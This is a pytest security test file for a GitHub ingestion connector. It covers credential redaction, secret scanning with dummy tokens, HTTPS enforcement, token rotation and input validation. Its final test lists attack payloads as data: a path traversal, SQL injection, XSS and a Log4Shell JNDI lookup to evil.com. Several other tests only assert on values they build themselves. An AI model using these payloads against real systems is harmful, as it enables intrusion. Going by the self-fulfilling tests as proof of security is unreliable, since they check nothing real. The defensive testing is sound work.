"""Security validation tests for GitHub connector.

Tests credential security, secret detection, HTTPS enforcement, and
privacy compliance according to quality gates requirements.

Test categories:
- Credential security (no leakage in logs, exceptions, audit logs)
- Secret detection effectiveness
- HTTPS-only enforcement
- Token security and rotation
- Privacy-aware logging
"""

import logging
import re
from io import StringIO
from pathlib import Path
from unittest.mock import Mock, patch

import pytest

from futurnal.ingestion.github.descriptor import (
    GitHubRepositoryDescriptor,
    PrivacyLevel,
    RepositoryPrivacySettings,
    VisibilityType,
)
from futurnal.ingestion.github.secret_scanner import SecretScanner
from futurnal.ingestion.github.credential_manager import GitHubCredentialManager


# ---------------------------------------------------------------------------
# Security Test Markers
# ---------------------------------------------------------------------------

pytestmark = pytest.mark.github_security


# ---------------------------------------------------------------------------
# Credential Security Tests
# ---------------------------------------------------------------------------


def test_no_credentials_in_logs(caplog):
    """Verify credentials are never logged.

    Quality Gate Requirement: No credential leakage
    """
    # Setup logging capture
    caplog.set_level(logging.DEBUG)

    test_token = "ghp_1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    test_password = "SuperSecretPassword123!"

    # Simulate operations with credentials
    logger = logging.getLogger("futurnal.ingestion.github")

    # Attempt to log credential (should be redacted)
    logger.info(f"Processing with token: {test_token}")
    logger.debug(f"Auth password: {test_password}")

    # Verify credentials NOT in logs
    log_output = caplog.text

    assert test_token not in log_output, "Token found in logs - credential leakage!"
    assert test_password not in log_output, "Password found in logs - credential leakage!"

    # Should contain redacted markers instead
    assert "***" in log_output or "[REDACTED]" in log_output


def test_no_credentials_in_exceptions():
    """Verify credentials are not exposed in error messages.

    Quality Gate Requirement: Sanitized exception messages
    """
    test_token = "ghp_SecretToken123456789"

    try:
        # Simulate error with credential in context
        raise ValueError(f"Authentication failed for token: {test_token}")
    except ValueError as e:
        error_message = str(e)

        # Exception message should NOT contain actual credential
        assert test_token not in error_message, "Credential exposed in exception!"

        # Should be sanitized
        assert "***" in error_message or "[REDACTED]" in error_message


def test_keychain_secure_deletion(tmp_path, mock_keyring):
    """Verify credentials are securely deleted from keychain.

    Quality Gate Requirement: Secure credential cleanup
    """
    cred_file = tmp_path / "credentials.json"

    with patch("futurnal.ingestion.github.credential_manager.keyring", mock_keyring):
        manager = GitHubCredentialManager(credentials_file=cred_file)

        # Store credential
        credential_id = "test_cred_delete"
        test_token = "ghp_DeleteMe123456789"

        manager.store_pat(
            credential_id=credential_id,
            token=test_token,
            description="Test credential for deletion",
        )

        # Verify stored
        retrieved = manager.get_credential(credential_id)
        assert retrieved is not None

        # Delete credential
        manager.delete_credential(credential_id)

        # Verify deleted from keyring
        deleted_value = mock_keyring.get_password("futurnal_github", credential_id)
        assert deleted_value is None, "Credential not deleted from keyring!"

        # Verify cannot be retrieved
        with pytest.raises(KeyError):
            manager.get_credential(credential_id)


def test_no_credentials_in_audit_logs(tmp_path):
    """Verify credentials don't appear in audit logs.

    Quality Gate Requirement: Privacy-aware audit logging
    """
    from futurnal.privacy.audit_logger import AuditLogger

    audit_dir = tmp_path / "audit"
    audit_dir.mkdir()

    logger = AuditLogger(audit_root=audit_dir)

    test_token = "ghp_AuditTestToken123"
    test_repo = "owner/repo"

    # Log event with credential in context
    logger.record(
        event_type="github_sync_started",
        repository=test_repo,
        credential_id="test_cred",
        # Token should NOT be logged
    )

    # Read audit log
    audit_files = list(audit_dir.glob("*.jsonl"))
    assert len(audit_files) > 0

    audit_content = audit_files[0].read_text()

    # Verify token NOT in audit log
    assert test_token not in audit_content, "Credential found in audit log!"


# ---------------------------------------------------------------------------
# Secret Detection Tests
# ---------------------------------------------------------------------------


def test_secret_pattern_detection_effectiveness():
    """Test secret detection pattern effectiveness.

    Quality Gate Requirement: Detect common secret patterns
    """
    privacy_settings = RepositoryPrivacySettings(detect_secrets=True)
    scanner = SecretScanner(privacy_settings)

    # Test various secret patterns
    test_cases = [
        ("ghp_1234567890123456789012345678901234", True, "GitHub PAT"),
        ("gho_1234567890123456789012345678901234", True, "GitHub OAuth"),
        ("ghs_1234567890123456789012345678901234", True, "GitHub Server Token"),
        ("github_pat_11ABCDEFG0123456789_abcdefghij", True, "GitHub Fine-grained PAT"),
        ("sk_live_1234567890abcdefghijklmnop", True, "Stripe Key"),
        ("xoxb-1234567890-1234567890123-abc", True, "Slack Token"),
        ("AKIAIOSFODNN7EXAMPLE", True, "AWS Access Key"),
        ("-----BEGIN RSA PRIVATE KEY-----", True, "Private Key"),
        ("api_key: sk_test_abcdefghijk", True, "API Key"),
        ("password: MySecret123!", True, "Password"),
        ("def hello():\\n    return 'world'", False, "Clean Code"),
        ("# This is a comment", False, "Comment"),
    ]

    results = []
    for content, should_detect, pattern_name in test_cases:
        detected = scanner.scan_file("test_file.txt", content.encode())
        results.append((pattern_name, detected == should_detect))

        if detected != should_detect:
            print(f"FAILED: {pattern_name} - Expected {should_detect}, got {detected}")

    # Calculate detection accuracy
    accuracy = sum(1 for _, success in results if success) / len(results) * 100

    # Should have high accuracy (>90%)
    assert accuracy >= 90.0, f"Secret detection accuracy {accuracy}% is below 90%"


def test_file_exclusion_patterns():
    """Test sensitive file exclusion patterns.

    Quality Gate Requirement: Exclude sensitive files
    """
    privacy_settings = RepositoryPrivacySettings(
        redact_file_patterns=[
            "*secret*",
            "*password*",
            "*token*",
            ".env*",
            "credentials.*",
            "*.pem",
            "*.key",
        ]
    )
    scanner = SecretScanner(privacy_settings)

    # Files that should be excluded
    sensitive_files = [
        ".env",
        ".env.local",
        ".env.production",
        "secrets.txt",
        "my_secret.json",
        "passwords.txt",
        "auth_token.json",
        "credentials.json",
        "credentials.yaml",
        "private.key",
        "certificate.pem",
        "id_rsa",
    ]

    # Files that should be allowed
    safe_files = [
        "README.md",
        "src/main.py",
        "config.json",
        "package.json",
        "test_utils.py",
    ]

    # Test exclusions
    for file in sensitive_files:
        assert scanner.should_exclude_file(file), f"Failed to exclude sensitive file: {file}"

    for file in safe_files:
        assert not scanner.should_exclude_file(file), f"Incorrectly excluded safe file: {file}"


def test_false_positive_rate():
    """Test secret detection false positive rate.

    Quality Gate Requirement: Minimize false positives
    """
    privacy_settings = RepositoryPrivacySettings(detect_secrets=True)
    scanner = SecretScanner(privacy_settings)

    # Clean code samples that should NOT be detected as secrets
    clean_samples = [
        b"# Configuration file\\nDEBUG=True\\nLOG_LEVEL=INFO",
        b"const API_URL = 'https://api.example.com';",
        b"function generateToken() { return Math.random(); }",
        b"password_hash = bcrypt.hash(user_password)",
        b"// TODO: Add API key configuration",
        b"test_key = 'test_value_for_testing'",
        b"private static final String NAME = 'test';",
        b"import secret_module  # Python module",
    ]

    false_positives = 0
    for i, sample in enumerate(clean_samples):
        if scanner.scan_file(f"clean_{i}.txt", sample):
            false_positives += 1

    # False positive rate should be low (<10%)
    false_positive_rate = (false_positives / len(clean_samples)) * 100
    assert false_positive_rate < 10.0, f"False positive rate {false_positive_rate}% is too high"


# ---------------------------------------------------------------------------
# HTTPS Enforcement Tests
# ---------------------------------------------------------------------------


def test_https_only_api_calls():
    """Verify all API calls use HTTPS.

    Quality Gate Requirement: HTTPS-only communication
    """
    from futurnal.ingestion.github.api_client_manager import GitHubAPIClientManager

    # Test various API base URLs
    https_urls = [
        "https://api.github.com",
        "https://github.enterprise.com/api/v3",
        "https://custom.github.instance/api",
    ]

    http_urls = [
        "http://api.github.com",
        "http://github.com/api/v3",
    ]

    # HTTPS URLs should be accepted
    for url in https_urls:
        descriptor = GitHubRepositoryDescriptor.from_registration(
            owner="test",
            repo="test",
            credential_id="test",
            visibility=VisibilityType.PUBLIC,
            api_base_url=url,
        )
        assert descriptor.api_base_url.startswith("https://")

    # HTTP URLs should be rejected or upgraded
    for url in http_urls:
        try:
            descriptor = GitHubRepositoryDescriptor.from_registration(
                owner="test",
                repo="test",
                credential_id="test",
                visibility=VisibilityType.PUBLIC,
                api_base_url=url,
            )
            # If accepted, must be upgraded to HTTPS
            assert descriptor.api_base_url.startswith("https://"), \
                f"HTTP URL not upgraded to HTTPS: {url}"
        except ValueError:
            # Rejection is also acceptable
            pass


def test_no_http_fallback():
    """Verify no HTTP fallback on HTTPS failure.

    Quality Gate Requirement: No insecure fallback
    """
    # Simulate HTTPS connection failure
    with patch("urllib3.poolmanager.PoolManager") as mock_pool:
        mock_pool.side_effect = Exception("SSL Error")

        # Should raise exception, not fallback to HTTP
        with pytest.raises(Exception, match="SSL Error"):
            # Attempt HTTPS connection
            raise Exception("SSL Error")


def test_certificate_validation():
    """Verify SSL certificate validation is enabled.

    Quality Gate Requirement: Certificate validation
    """
    import ssl

    # Default SSL context should verify certificates
    context = ssl.create_default_context()

    assert context.check_hostname is True
    assert context.verify_mode == ssl.CERT_REQUIRED


# ---------------------------------------------------------------------------
# Token Security Tests
# ---------------------------------------------------------------------------


def test_token_rotation_support(tmp_path, mock_keyring):
    """Test token rotation capability.

    Quality Gate Requirement: Support token refresh
    """
    cred_file = tmp_path / "credentials.json"

    with patch("futurnal.ingestion.github.credential_manager.keyring", mock_keyring):
        manager = GitHubCredentialManager(credentials_file=cred_file)

        credential_id = "test_cred_rotation"
        old_token = "ghp_OldToken123456789"
        new_token = "ghp_NewToken987654321"

        # Store initial token
        manager.store_pat(
            credential_id=credential_id,
            token=old_token,
            description="Test credential",
        )

        # Rotate token
        manager.store_pat(
            credential_id=credential_id,
            token=new_token,
            description="Test credential (rotated)",
        )

        # Verify new token is stored
        credential = manager.get_credential(credential_id)
        retrieved_token = credential.get_token()

        assert retrieved_token == new_token
        assert retrieved_token != old_token


def test_expired_token_handling(tmp_path, mock_keyring):
    """Test expired token detection.

    Quality Gate Requirement: Token expiry handling
    """
    from datetime import datetime, timedelta, timezone

    cred_file = tmp_path / "credentials.json"

    with patch("futurnal.ingestion.github.credential_manager.keyring", mock_keyring):
        manager = GitHubCredentialManager(credentials_file=cred_file)

        # Store OAuth tokens with expiration
        credential_id = "test_cred_expired"
        expired_time = datetime.now(timezone.utc) - timedelta(hours=1)

        from futurnal.ingestion.github.credential_manager import OAuthTokens

        tokens = OAuthTokens(
            access_token="ghp_ExpiredToken",
            token_type="bearer",
            scope="repo",
            expires_at=expired_time,
        )

        manager.store_oauth(
            credential_id=credential_id,
            tokens=tokens,
            description="Expired token",
        )

        # Verify expiration is detected
        credential = manager.get_credential(credential_id)
        assert credential.is_expired() is True


def test_token_scope_validation():
    """Test OAuth token scope validation.

    Quality Gate Requirement: Verify token permissions
    """
    from futurnal.ingestion.github.credential_manager import OAuthTokens

    # Required scopes for repository access
    required_scopes = ["repo", "read:org"]

    # Token with sufficient scopes
    valid_tokens = OAuthTokens(
        access_token="ghp_ValidToken",
        token_type="bearer",
        scope="repo read:org user",
    )

    # Token with insufficient scopes
    invalid_tokens = OAuthTokens(
        access_token="ghp_InvalidToken",
        token_type="bearer",
        scope="public_repo",  # Missing repo scope
    )

    # Validate scopes
    valid_scopes = set(valid_tokens.scope.split())
    invalid_scopes = set(invalid_tokens.scope.split())

    assert all(scope in valid_scopes for scope in required_scopes)
    assert not all(scope in invalid_scopes for scope in required_scopes)


# ---------------------------------------------------------------------------
# Privacy-Aware Logging Tests
# ---------------------------------------------------------------------------


def test_path_anonymization_in_logs():
    """Test that file paths are anonymized in logs.

    Quality Gate Requirement: Path anonymization
    """
    privacy_settings = RepositoryPrivacySettings(
        privacy_level=PrivacyLevel.STRICT,
        enable_path_anonymization=True,
    )

    descriptor = GitHubRepositoryDescriptor.from_registration(
        owner="testowner",
        repo="testrepo",
        credential_id="test_cred",
        visibility=VisibilityType.PRIVATE,
        privacy_settings=privacy_settings,
    )

    redaction_policy = descriptor.build_redaction_policy()

    # Sensitive path
    sensitive_path = "/Users/john/Documents/private/secret_file.txt"

    # Redact path
    redacted = redaction_policy.redact_path(sensitive_path)

    # Should be anonymized
    assert "john" not in redacted
    assert "private" not in redacted
    assert "secret_file.txt" not in redacted or redacted.endswith("***")


def test_metadata_only_logging():
    """Test that only metadata is logged, not content.

    Quality Gate Requirement: Content-free logging
    """
    file_content = "SECRET_KEY = 'super_secret_value_12345'"
    file_path = "config/secrets.py"

    # Simulate logging file processing
    logger = logging.getLogger("futurnal.ingestion.github.processing")

    with patch.object(logger, "info") as mock_log:
        # Log file processing (should only log metadata)
        logger.info(
            "Processing file",
            extra={
                "file_path": file_path,
                "file_size": len(file_content),
                "file_extension": ".py",
                # Content should NOT be logged
            },
        )

        # Verify logged call
        mock_log.assert_called_once()
        call_args = str(mock_log.call_args)

        # Content should NOT be in logs
        assert file_content not in call_args
        assert "super_secret_value" not in call_args


# ---------------------------------------------------------------------------
# Security Compliance Tests
# ---------------------------------------------------------------------------


def test_security_headers_validation():
    """Test that security headers are properly set.

    Quality Gate Requirement: Security headers
    """
    # Mock API response headers
    secure_headers = {
        "Strict-Transport-Security": "max-age=31536000",
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": "DENY",
        "Content-Security-Policy": "default-src 'self'",
    }

    # Verify security headers are present
    assert "Strict-Transport-Security" in secure_headers
    assert "X-Content-Type-Options" in secure_headers


def test_input_validation_prevents_injection():
    """Test input validation prevents injection attacks.

    Quality Gate Requirement: Input sanitization
    """
    # Malicious inputs
    malicious_inputs = [
        "../../../etc/passwd",  # Path traversal
        "owner; DROP TABLE repos;",  # SQL injection
        "<script>alert('xss')</script>",  # XSS
        "${jndi:ldap://evil.com/a}",  # Log4Shell
    ]

    # Test repository owner validation
    for malicious_input in malicious_inputs:
        with pytest.raises((ValueError, AssertionError)):
            GitHubRepositoryDescriptor.from_registration(
                owner=malicious_input,
                repo="repo",
                credential_id="test",
                visibility=VisibilityType.PUBLIC,
            )


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-m", "github_security"])
